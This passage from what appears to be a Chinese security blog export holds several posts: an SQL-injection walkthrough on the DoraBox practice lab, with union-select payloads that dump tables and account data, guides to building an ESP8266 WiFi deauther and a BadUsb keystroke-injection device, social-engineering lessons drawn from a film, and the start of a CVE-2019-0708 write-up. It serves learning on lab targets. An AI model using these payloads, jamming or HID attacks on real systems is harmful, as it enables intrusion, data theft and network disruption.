<h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p>1 order by 3 返回正常 1 order by 4 返回错误 所以前者正确</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg5.PNG" title="timg">

<h4 id="爆库名，用户"><a href="#爆库名，用户" class="headerlink" title="爆库名，用户"></a>爆库名，用户</h4><p>-1 union select 1,database(),user()</p>
<p>可以看见 库名为 pentest 用户为 root@localhost</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg6.PNG" title="timg">

<h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><p>-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</p>
<p>可以看见有两张表 account 和 news</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg7.PNG" title="timg">

<h4 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h4><p>-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’account’</p>
<p>可以看见三个列名 id rest own</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg8.PNG" title="timg">

<h4 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h4><p>-1 union select 1,2,concat_ws(‘|’,id,rest,own) from account</p>
<p>可以看见各列内容 至此本次练习结束</p>
<img src="/2019/11/02/DoraBox漏洞练习平台_SQL注入（一）/timg9.PNG" title="timg">

<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>DoraBox漏洞练习平台，难度不高，覆盖面广，包含多种常见Web漏洞环境，作为基础练习能很快上手。</p>
<p>本次练习为DoraBox漏洞练习平台中非常基础的SQli数字型注入</p>
<p>DoraBox项目地址：<a href="https://github.com/gh0stkey/DoraBox">https://github.com/gh0stkey/DoraBox</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>靶场练习</tag>
        <tag>Web渗透</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>物理hacker之Esp8266_deauther</title>
    <url>/2019/10/30/%E7%89%A9%E7%90%86Hacker%E4%B9%8BEsp8266-deauther/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>就在前几天，对，又是前几天，逛公众号的时候，一个醒目的标题吸引了我——《震惊！高校成年男子竟然在宿舍做出这等事……》，hhh玩笑玩笑。其实是看见了一个号称断网神器的东西，ESP8266，没错，又是开发板。简单的看了一下文章内容，好像不是很难（其实真做的时候满满的BUG，心塞。）立刻某宝走起，两天到货。上午忙碌了几个小时，无数报错后，终于完成！下面就来说说我这几小时烧制的苦逼经历。</p>
<h1 id="关于Esp8266"><a href="#关于Esp8266" class="headerlink" title="关于Esp8266"></a>关于Esp8266</h1><h5 id="什么是Esp8266-deauther？"><a href="#什么是Esp8266-deauther？" class="headerlink" title="什么是Esp8266_deauther？"></a>什么是Esp8266_deauther？</h5><p>在我简单看来，Esp8266就是一个WIFI芯片，具体可以看<a href="https://www.espressif.com/zh-hans/products/hardware/esp8266ex/overview" target="_blank" rel="noopener">官方解释</a>。就是这样一个微型WIFI模块，被国外的大神搞出了点名堂，叫esp8266_deauther</p>
<p>Github：<a href="https://github.com/spacehuhn/esp8266_deauther">https://github.com/spacehuhn/esp8266_deauther</a></p>
<a id="more"></a>

<p>里面讲了一些更新信息、安装方法、注意事项等等,还包括烧制的不同方法，具体的教学步骤等，参考项目就可以完成全部操作</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg1.PNG" title="timg">

<h5 id="Esp8266-deauther可以用来做什么？"><a href="#Esp8266-deauther可以用来做什么？" class="headerlink" title="Esp8266_deauther可以用来做什么？"></a>Esp8266_deauther可以用来做什么？</h5><p>尽管作者已经说明过，不应当对项目 标有WIFI阻断，WIFI攻击等标签，但也许是我个人才学疏浅，未得真谛，暂且我也只能将其功能用途理解为WIFI干扰，当然这只是功能带来的实际表象，并不能代表项目的存在意义。</p>
<p>Esp8266_deauther可以通过多种方式干扰周围WIFI，达到复刻SSID，阻塞目标网络，建立僵尸热点等。</p>
<h1 id="Esp8266-deauther实现过程"><a href="#Esp8266-deauther实现过程" class="headerlink" title="Esp8266_deauther实现过程"></a>Esp8266_deauther实现过程</h1><h5 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h5><p>硬件很简单，也很容易购买，价格不贵，某宝上一搜一大把，同时也可以在Github中提到的地址购买（略贵），这是官方淘宝店铺，如图：</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg3.PNG" title="timg">

<p>这是淘宝上其他店铺的，具体买哪个还是看自己，</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg4.PNG" title="timg">

<p>以下是我买的Esp8266 cp2102，大约二十多，不是最低价，那些五六块的也不敢买。</p>
<p>买的时候注意看型号 CP2102 和CH340 两钟都可以，之后安装不同的驱动就行。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg5.jpg" title="timg">

<h5 id="软件准备"><a href="#软件准备" class="headerlink" title="软件准备"></a>软件准备</h5><p>板子准备好，接下来就是驱动，烧制软件之类的了。</p>
<p>之前让留意的板子的型号现在派上用场，在原项目GitHub中找到这个地方，什么型号就下载什么驱动，下载下来解压安装就可以了</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg6.PNG" title="timg">

<p>插上你的Esp8266到电脑，在设备管理器-端口 可以看见你的设备则表示驱动安装完成。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg8.PNG" title="timg">

<p>下一步准备烧制软件，在原项目GitHub中有提到不同的方法，官方强烈建议我们使用的是Arduino IDE，因为之前制作BadUsb的时候我就是使用的Arduino IDE 所以毅然决然放弃了其他教程里提到的使用ESP8266Flasher去使用Arduino IDE。不过很快，我就为我这种做法付出了代价，漫天的BUG，各种报错，一个接一个处理不完，遂，还是老老实实用ESP8266Flasher。真香，操作比Arduino IDE简单，也没有各种错误。下载安装完ESP8266Flasher，进入初始界面会自动匹配你的port，然后进入Advanced调配参数，如图：</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg2.PNG" title="timg">

<p>接着回到Operation界面 点击FLASH等待蓝条到头，左下角出现绿钩就烧制完成了，在此期间，板子会长时间闪光，属正常反应。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg7.PNG" title="timg">

<h5 id="操作界面"><a href="#操作界面" class="headerlink" title="操作界面"></a>操作界面</h5><p>烧制完成后，给你的板子通上电源，接着搜索WIFI会出现一个名称为pwned的网络，默认密码deauther,连接</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg13.png" title="timg">

<p>连接pwned后，浏览器进入192.168.4.1，就能进入Esp8266_deauther的web界面。首先会进入一个确认界面，里面描述了项目的相关须知，以及安全声明，点击I HAVE READ AND UNDERSTAND 就可以进入了主页面了</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg14.PNG" title="timg">

<p>进入主页面，左上角的Scan，SSIDs,Attacks,Settings，可以进入不同分页</p>
<p>Scan页面主要是扫描WIFI，Set Target等</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg9.PNG" title="timg">

<p>SSIDs页面可以设立虚拟WIFI，可以在选项random mode中设置随机生成大量无线网络干扰周围的无线环境。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg10.PNG" title="timg">

<p>Attacks页面就是攻击指令页面，可以控制deauth，beacon 的开始/停止。</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg11.PNG" title="timg">

<p>Settings页面对Esp8266_deauther整个项目进行设置，比如自动保存间隔，默认的WIFI名称/密码，重启/关闭，版本等等</p>
<img src="/2019/10/30/物理Hacker之Esp8266-deauther/timg12.PNG" title="timg">


<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>几个小时下来没白费，也算是弄出来了，就是中途头铁使用Arduino IDE那会浪费很多时间，整的人也很自闭，不过结果还是好的。最后没有说明具体以如何使用，因为能做到这一步也不是傻子了，界面一看就都懂了。自己做完也迫不及待的实验了一下（经过同意的），确实有用。板子很容易热，但是不影响啥，毕竟是小玩意儿，不能和专业的比。想了想，配合Kali抓指定wifi握手包会不会有奇效？先保留思考，以后再整。</p>
<p>参考文献：</p>
<p><a href="https://github.com/spacehuhn/esp8266_deauther">https://github.com/spacehuhn/esp8266_deauther</a></p>
<p><a href="https://www.jianshu.com/p/f064ca36ee92" target="_blank" rel="noopener">https://www.jianshu.com/p/f064ca36ee92</a></p>
<p><a href="https://blog.csdn.net/mjx19951117/article/details/95808633" target="_blank" rel="noopener">https://blog.csdn.net/mjx19951117/article/details/95808633</a></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>小玩意儿</tag>
        <tag>物理hack</tag>
        <tag>无线WIFI</tag>
      </tags>
  </entry>
  <entry>
    <title>物理Hacker之BadUsb</title>
    <url>/2019/10/28/%E7%89%A9%E7%90%86Hacker%E4%B9%8BBadUsb/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>已经忘了在什么地方看见了BadUsb相关内容，当时就觉得很酷炫，我也要搞一个，说做就做。</p>
<p>于是在群里咨询了大佬们，厚着脸皮要来了一些资料，加上度娘的帮助，我开始了行动。</p>
<h1 id="关于BadUsb"><a href="#关于BadUsb" class="headerlink" title="关于BadUsb"></a>关于BadUsb</h1><h5 id="什么是BadUsb"><a href="#什么是BadUsb" class="headerlink" title="什么是BadUsb"></a>什么是BadUsb</h5><p>起初我觉得BadUsb同他的名字一样，Bad，Usb。显而易见，是坏的USB，对电脑不利的Usb。通过BadUsb操作，可以完成让目标主机感染病毒、安装后门、开放端口、蓝屏、自动开机、DNS劫持等等一系列操作。在了解一些后，我个人理解BadUsb 是通过插入电脑后执行恶意代码从而达到目的的一种Usb。当然我的这些都是粗浅的解释。<br>专业来说实际上BadUSB就是通过对U盘的固件进行逆向重新编程，相当于改写了U盘的操作系统而进行攻击的。</p>
<a id="more"></a>

<h5 id="BadUsb的内部构造"><a href="#BadUsb的内部构造" class="headerlink" title="BadUsb的内部构造"></a>BadUsb的内部构造</h5><img src="/2019/10/28/物理Hacker之BadUsb/timg1.PNG" title="timg">

<p>U盘由芯片控制器和闪存两部分组成，芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；</p>
<p>闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。</p>
<h5 id="为什么可以使用BadUsb攻击？"><a href="#为什么可以使用BadUsb攻击？" class="headerlink" title="为什么可以使用BadUsb攻击？"></a>为什么可以使用BadUsb攻击？</h5><p>这就要说到USB协议中存在的安全漏洞。</p>
<p>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码</p>
<p>所以BadUsb实际上是利用HID(Human InterfaceDevice,是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击的类型。</p>
<p>其他的在BadUsb出现之前，类似还有<a href="https://blog.csdn.net/ctonegao/article/details/49406763" target="_blank" rel="noopener">USB RUBBERDUCKY和Teensy</a> 。</p>
<h1 id="制作BadUsb"><a href="#制作BadUsb" class="headerlink" title="制作BadUsb"></a>制作BadUsb</h1><p>严格意义上不能说制作，因为固件很难自己制作出来的，所以我从某宝上买个板子，之后再写入代码。</p>
<h5 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h5><p>某宝上20-40一个，内部就是一个Arduino Leonardo开发板，然后包装成Usb的样子</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg2.PNG" title="timg">

<p>2天到货，就是这么一个东西</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg4.jpg" title="timg">

<h5 id="软件准备"><a href="#软件准备" class="headerlink" title="软件准备"></a>软件准备</h5><p>现在板子有了，接下来就是写代码，这里使用Arduino IDE 。百度搜索即可下载得到</p>
<p>安装完成后，打开dalao给的测试代码，先看一下界面</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg3.PNG" title="timg">

<p>一看见代码，明白人都明白，就是模拟键盘！</p>
<h5 id="操作准备"><a href="#操作准备" class="headerlink" title="操作准备"></a>操作准备</h5><p>刚买来的开发板里面是没有东西的，所以不必担心可以放心的插到电脑上，当然不排除黑心商家，提前往里面放点什么，还是要提高警惕的。插到电脑上之后，在设备管理器中可以看见插入的开发板</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg5.PNG" title="timg">

<p>在Arduino IDE中菜单栏工具中选择开发板→开发板管理器</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg6.png" title="timg">

<p>联网安装Arduino AVR Boards板子：</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg7.PNG" title="timg">

<p>到这里就基本准备完成，之后写完代码按Ctrl+R 验证\编译通过 等待底下提示就完成了</p>
<h5 id="更改代码"><a href="#更改代码" class="headerlink" title="更改代码"></a>更改代码</h5><p>假设BadUsb写入了蓝屏代码，那下次想要更改代码怎么办？</p>
<p>提前桌面新建一个空白txt打开，在插入BadUsb时鼠标不停地点击txt内部，让模拟键盘的输入，都输入到txt文档里，等待全部执行完，就可以正常更改代码了</p>
<p>这里是一些我已经收集到的现成代码</p>
<img src="/2019/10/28/物理Hacker之BadUsb/timg8.PNG" title="timg">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>成本低，方法简单，黑科技。方法总比困难多，配合社工使用，效果出奇！</p>
<h5 id="相关文章-："><a href="#相关文章-：" class="headerlink" title="相关文章 ："></a>相关文章 ：</h5><p><a href="https://blog.csdn.net/kclax/article/details/90722080" target="_blank" rel="noopener">https://blog.csdn.net/kclax/article/details/90722080</a></p>
<p><a href="https://www.cnblogs.com/lee-li/p/9080160.html" target="_blank" rel="noopener">https://www.cnblogs.com/lee-li/p/9080160.html</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1480567" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1480567</a></p>
]]></content>
      <categories>
        <category>硬件</category>
      </categories>
      <tags>
        <tag>小玩意儿</tag>
        <tag>物理hack</tag>
      </tags>
  </entry>
  <entry>
    <title>从电影看社工：《逍遥法外》</title>
    <url>/2019/10/18/%E4%BB%8E%E7%94%B5%E5%BD%B1%E7%9C%8B%E7%A4%BE%E5%B7%A5%EF%BC%9A%E3%80%8A%E9%80%8D%E9%81%A5%E6%B3%95%E5%A4%96%E3%80%8B/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://baike.baidu.com/item/%E7%8C%AB%E9%BC%A0%E6%B8%B8%E6%88%8F/24452?fr=aladdin" target="_blank" rel="noopener">《猫鼠游戏》</a>（英语名：Catch Me If You Can）也被译为《逍遥法外》是梦工场电影公司出品、斯蒂文·斯皮尔伯格执导的犯罪电影，由莱昂纳多·迪卡普里奥、汤姆·汉克斯主演，于2002年12月25日在美国上映。<br>该片根据小弗兰克·阿巴戈内尔的自传《有本事来抓我吧——一个诈骗犯令人惊异的真实故事》改编，讲述了FBI探员卡尔与擅长伪造文件的罪犯弗兰克之间进行一场场猫抓老鼠的较量的故事。本片的主角原型为小弗兰克·阿巴格诺，FBI史上年纪最小的头号通缉犯，15岁伪造支票，17岁假扮飞行员，不到二十岁伪造了教师，医生，律师等多个身份。</p>
<p>我将从电影情节中，具体剖析小弗兰克·阿巴格诺的一次次社工行为。</p>
<a id="more"></a>


<h1 id="欺骗的开始"><a href="#欺骗的开始" class="headerlink" title="欺骗的开始"></a>欺骗的开始</h1><p>从电影中可以看见小弗兰克·阿巴戈内尔的第一次欺骗是在遭遇家庭变故后转学后的第一堂课，为报复同学欺凌，小弗兰克·阿巴戈内尔刚上课的第一天便假扮代课老师，给学生们好好“上了一课”。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg1.PNG" title="timg">

<p>在这一周里，小弗兰克·阿巴戈内尔给同学们上课、复习、布置作业，甚至开了一次家长会，期间没有一个人发现异常，连真的代课老师都信以为真。</p>
<p>小弗兰克·阿巴戈内尔在影片的一开始就让我震惊了，真乃神人！这样的事情往往是我们学生时代只敢在心里想想的，而他真的做了，还做的很成功！这就是小弗兰克·阿巴戈内尔的一次欺骗，也是一次社工。</p>
<p>小弗兰克·阿巴戈内尔做了什么？</p>
<h5 id="模仿老师的语气、老师的姿态"><a href="#模仿老师的语气、老师的姿态" class="headerlink" title="模仿老师的语气、老师的姿态"></a>模仿老师的语气、老师的姿态</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg3.PNG" title="timg">

<h5 id="满怀自信的行动"><a href="#满怀自信的行动" class="headerlink" title="满怀自信的行动"></a>满怀自信的行动</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg2.PNG" title="timg">

<p>而因为转学的缘故小弗兰克·阿巴戈内尔恰巧穿着以前学校的制服，让他和周围的同学“与众不同”。加上自信的语气，动作，这一切都暗暗告诉着周围的人，我，小弗兰克·阿巴戈内尔就是这里的代课老师！</p>
<p>这一次的成功小弗兰克·阿巴戈内尔从穿着、语气、动作模仿了代课老师，让同学信以为真。</p>
<h1 id="童年的不幸遭遇"><a href="#童年的不幸遭遇" class="headerlink" title="童年的不幸遭遇"></a>童年的不幸遭遇</h1><p>小弗兰克·阿巴戈内尔遭遇家庭变故，父母离婚，无法接受现实的他决定离家出走，作为一个16岁的少年，他身无分文，于是，再一次的激发了他与生俱来的能力，欺骗。</p>
<p>他开始伪造支票</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg5.PNG" title="timg">

<p>同时试图瞒天过海兑换假支票</p>
<h5 id="通过金钱吸引，降低防范"><a href="#通过金钱吸引，降低防范" class="headerlink" title="通过金钱吸引，降低防范"></a>通过金钱吸引，降低防范</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg6.PNG" title="timg">

<h5 id="通过表达孝心，放松警惕"><a href="#通过表达孝心，放松警惕" class="headerlink" title="通过表达孝心，放松警惕"></a>通过表达孝心，放松警惕</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg7.PNG" title="timg">

<h5 id="利用学生身份，求取帮助"><a href="#利用学生身份，求取帮助" class="headerlink" title="利用学生身份，求取帮助"></a>利用学生身份，求取帮助</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg8.PNG" title="timg">

<h5 id="通过假装生病，博得同情"><a href="#通过假装生病，博得同情" class="headerlink" title="通过假装生病，博得同情"></a>通过假装生病，博得同情</h5><img src="/2019/10/18/从电影看社工：《逍遥法外》/timg9.PNG" title="timg">

<p>即便他依旧失败了，但是却留给了他很多经验，给了我们很多方法</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg10.PNG" title="timg">



<h1 id="世界大盗"><a href="#世界大盗" class="headerlink" title="世界大盗"></a>世界大盗</h1><p>经历了多处碰壁的小弗兰克·阿巴戈内尔没有放弃。偶然的机会，让他打起了飞行员的注意，他想冒充飞行员。这一次的小弗兰克·阿巴戈内尔没有贸然行动，而是先假冒学生记者，以学生的身份对飞行员内部进行采访，收集信息，在充分了解飞行员这个职业后，保证自己不会轻易露馅。这便是常说的踩点，very very的重要</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg11.PNG" title="timg">

<p>经过一些了解，小弗兰克·阿巴戈内尔成功的伪装成一名飞行员，在世界的上空免费飞行了百万英里。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg12.PNG" title="timg">

<p>从伪装成一名飞行员开始，小弗兰克·阿巴戈内尔才算是真正走上了他的欺骗之旅。之后他又利用天赋，成功制造假的航空支票并兑换了上百万美元，这些行为渐渐引起了FBI的注意。在他即将被追捕的时候，他又伪装成美国特情局的人，假装自己已经被“自己”抓捕了，借此逃脱一轮。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg13.PNG" title="timg">

<p>从此处逃脱后，小弗兰克·阿巴戈内尔在一处小镇伪装成了一名医生，利用伪装支票的手法，他从其他地方剪裁，烙印辨别标志，利用从电视上学到的医学话术，达到以假乱真的效果，让所有人相信他就是一名医生。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg14.PNG" title="timg">

<h1 id="回归正途"><a href="#回归正途" class="headerlink" title="回归正途"></a>回归正途</h1><p>虽然小弗兰克·阿巴戈内尔拥有过人的天赋，但是法网恢恢疏而不漏，最终他还是被FBI探员卡尔在法国的一个小镇逮捕。在服役期间卡尔发现了小弗兰克·阿巴戈内尔的天赋，最后让他在FBI经济犯罪科帮助破案，完成他剩下的劳役。</p>
<img src="/2019/10/18/从电影看社工：《逍遥法外》/timg16.PNG" title="timg">

<h1 id="电影中的社工"><a href="#电影中的社工" class="headerlink" title="电影中的社工"></a>电影中的社工</h1><p>从小弗兰克·阿巴戈内尔的遭遇中，我们可以看到很多社工的影子在里面。小弗兰克·阿巴戈内尔的每一次伪装都是社工。</p>
<h5 id="伪装成老师"><a href="#伪装成老师" class="headerlink" title="伪装成老师"></a>伪装成老师</h5><p>小弗兰克·阿巴戈内尔 从着装、语言、动作等方面模拟老师，让同学信以为真</p>
<h5 id="伪装成飞行员"><a href="#伪装成飞行员" class="headerlink" title="伪装成飞行员"></a>伪装成飞行员</h5><p>小弗兰克·阿巴戈内尔 从着装、专业知识、仪态等方面模仿飞行员，让周围人相信他是一名飞行员，期间包括踩点了解信息等等重要途径</p>
<h5 id="伪装成医生"><a href="#伪装成医生" class="headerlink" title="伪装成医生"></a>伪装成医生</h5><p>小弗兰克·阿巴戈内尔利用报纸上的院校标志，纪念品上的院校标志等等先伪造了一份十分厉害的简历，再去面试医生。成功成为医生后，小弗兰克·阿巴戈内尔通过电视上学到的医用术语瞒天过海，始终维持着自己的身份。</p>
<h5 id="伪造支票"><a href="#伪造支票" class="headerlink" title="伪造支票"></a>伪造支票</h5><p>小弗兰克·阿巴戈内尔在伪造支票非常有天赋，他注意到了方方面面，从支票的墨水、厚度、折痕、标志各个方面伪造支票，利用支票跨州传递到银行的真空期达到套取现金的目的。在前期小弗兰克·阿巴戈内尔伪造的支票还不完美的时候，他还通过其他途径吸引支票兑换者的注意力，比如通过金钱，假装生病，利用学生身份，利用对方的同情心等等方法，降低对方的防范意识，以防假支票被发现。</p>
<h1 id="一次成功的社工"><a href="#一次成功的社工" class="headerlink" title="一次成功的社工"></a>一次成功的社工</h1><p>从小弗兰克·阿巴戈内尔的经历来看，不管是伪装成什么职业，飞行员，老师，医生也好，最不可缺少的就是自信与勇气。</p>
<p>首先就要勇气去做，其次要有信心自己能做好。只有自身展现出自信，才能让周围人相信。如果唯唯诺诺，鬼鬼祟祟难免让周围人怀疑。</p>
<p>然后需要充分的知识铺垫，才能让自己维持身份，在进行相关职业活动的时候不会因为自己是外行人而露出破绽。</p>
<p>最后一点就是要注意细节，往往细节决定成败。就是因为小弗兰克·阿巴戈内尔注意墨水，纸张厚度，折痕这些小细节，才让他手中的支票连银行都无法辨认。</p>
<p>以上这些都是从一部电影中吸取来的，而我们生活中也处处充满着社工的痕迹，只要我们细心发现，就能从方方面面学到更多，从而提升自己。</p>
]]></content>
      <categories>
        <category>理论</category>
      </categories>
      <tags>
        <tag>社工</tag>
        <tag>小玩意儿</tag>
      </tags>
  </entry>
  <entry>
    <title>知己知彼-信息搜集</title>
    <url>/2019/10/06/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p>这是一次有关信息搜集的小结。</p>
<p>导图主要包含搜集信息的常用途径汇总，如Google Hacking常用语法，Shodan基本使用语法，Recon-ng，Nslookup，cupp，Exif，Archive</p>
<a id="more"></a>

<img src="/2019/10/06/信息搜集/信息搜集.jpg" title="avatar">
]]></content>
      <categories>
        <category>理论</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>信息搜集</tag>
        <tag>社工</tag>
      </tags>
  </entry>
  <entry>
    <title>MyQR实现动态二维码</title>
    <url>/2019/10/03/%E5%8A%A8%E6%80%81%E4%BA%8C%E7%BB%B4%E7%A0%81/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>逛公众号的时候，发现myqr，github上已经6000+Star，感觉挺有趣，就想着自己也动手做一个。</p>
<h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>首先通过pip安装myqr库</p>
<pre><code>pip install myqr</code></pre><p>接下来有两种方法可以实现。</p>
<a id="more"></a>

<h4 id="第一种方式通过控制台命令"><a href="#第一种方式通过控制台命令" class="headerlink" title="第一种方式通过控制台命令"></a>第一种方式通过控制台命令</h4><p>myqr参数</p>
<p>-v    {1,2,3,…,40}    控制边长，范围是1至40，数字越大边长越大</p>
<p>-l    {L,M,Q,H}    控制纠错水平，范围是L、M、Q、H，从左到右依次升高</p>
<p>-n    output-filename    控制文件名，默认文件名是“ qrcode.png “,格式可以是 .jpg， .png ，.bmp ，.gif</p>
<p>-d    output-directory    设置输出文件路径，而默认存储位置是当前目录</p>
<p>-p    picture_file    引入图片，生成结合图片的二维码</p>
<p>-c    不用取    可以使产生的图片由黑白变为彩色的</p>
<p>-con    contrast    对比度，1.0 表示原始图片，更小的值表示更低对比度，更大反之。默认为1.0</p>
<p>-bri    brightness    亮度，用法和取值与 -con 相同</p>
<pre><code>myqr http://ggboom993.org.cn -p timg1.gif -c</code></pre><p>我这里二维码的内容就使用我的博客地址：<a href="http://ggboom993.org.cn" target="_blank" rel="noopener">http://ggboom993.org.cn</a></p>
<p>接着使用-p参数指定二维码的样式(图片) 采用我预先下载好的gif图片 timg1.gif </p>
<p>图片放在C:\Users\dell 目录下</p>
<img src="/2019/10/03/动态二维码/timg1.gif" title="timg">


<p>使用-c参数让二维码变成彩色，我这里的gif本身就是黑白的，有没有-c都可以</p>
<p>如果没有指定生成图片的名称，myqr会在当前目录下默认生成名称为timg1_QRcode的gif图片，如果有需要则可以使用-n参数指定生成图片的名称。</p>
<p>最后生成的动态二维码如下：</p>
<img src="/2019/10/03/动态二维码/timg2.gif" title="timg">

<h4 id="第二种方式通过python实现"><a href="#第二种方式通过python实现" class="headerlink" title="第二种方式通过python实现"></a>第二种方式通过python实现</h4><p>python代码如下</p>
<pre><code>from MyQR import myqr

myqr.run(
    words=&apos;http://ggboom993.org.cn&apos;,
    pictures=&apos;timg.tif&apos;,
    colorized=True,
    save_name=&apos;save_3.tif&apos;,
    )</code></pre><p>words内指定二维码内容</p>
<p>Pictures指定二维码样式（图片）</p>
<p>colorized指定二维码是否为彩色</p>
<p>save_name指定生成图片的名称</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>小玩意儿</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透相关小结</title>
    <url>/2019/10/03/aboutWebSecurity/</url>
    <content><![CDATA[<p>此次Web安全的小结，完成于2018年8月，以导图形式留存。</p>
<p>导图内容主要包含Web渗透常用方法如SQL注入、XSS、CSRF、SSRF、爆破、越权、目录遍历、PHP反序列化、XXE、文件上传下载、REC远程执行的简单描述和简单总结。</p>
<a id="more"></a>

<img src="/2019/10/03/aboutWebSecurity/Web安全.jpg" title="avatar">

]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Web渗透</tag>
        <tag>sql注入</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2019-0708漏洞复现</title>
    <url>/2019/10/01/CVE-2019-0708/</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>北京时间5月15日，微软发布了针对远程桌面服务的远程执行代码漏洞CVE-2019-0708的修复程序, 漏洞触发无需用户交互。这也就意味着，攻击者可以利用该漏洞制作类似于2017年席卷全球的WannaCry类的蠕虫病毒，进行大规模传播和破坏。</p>
<p>远程桌面服务（以前称为终端服务）中存在远程执行代码漏洞，当未经身份验证的攻击者使用RDP连接到目标系统并发送特制请求时。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后攻击者可以安装程序; 查看，更改或删除数据; 或创建具有完全用户权限的新帐户。要利用此漏洞，攻击者仅需要通过RDP向目标系统远程桌面服务发送恶意请求。</p>
<a id="more"></a>

<p>该漏洞影响了某些旧版本的Windows系统，如下：</p>
<p>Windows 7</p>
<p>Windows Server 2008 R2</p>
<p>Windows Server 2008</p>
<p>Windows 2003</p>
<p>Windows XP</p>
<p>需要注意的是：Windows 8和Windows 10及之后版本的用户不受此漏洞影响。</p>
<p>本次漏洞时间线：</p>
<p>1、2019年5月14日<br>微软发布远程桌面服务远程代码执行漏洞CVE-2019-0708的安全通告及相应补丁，并特别针对此漏洞发布了专门的说明，提示这是一个可能导致蠕虫泛滥的严重漏洞</p>
<p>2、2019年5月23日<br>互联网公开渠道出现具有非破坏性漏洞扫描功能的PoC程序</p>
<p>3、2019年5月25日<br>黑客开始大规模扫描存在漏洞的设备</p>
<p>4、2019年5月30日<br>微软再次发布对于CVE-2019-0708漏洞做修补的提醒，基于漏洞的严重性强烈建议用户尽快升级修复</p>
<p>5、2019年5月31日<br>互联网公开渠道出现能导致蓝屏的PoC代码，斗象安全应急响应团队已经确认了PoC代码的可用性</p>
<p>6、2019年6月8日<br>Metasploit的商业版本开始提供能导致远程代码执行的漏洞利用模块</p>
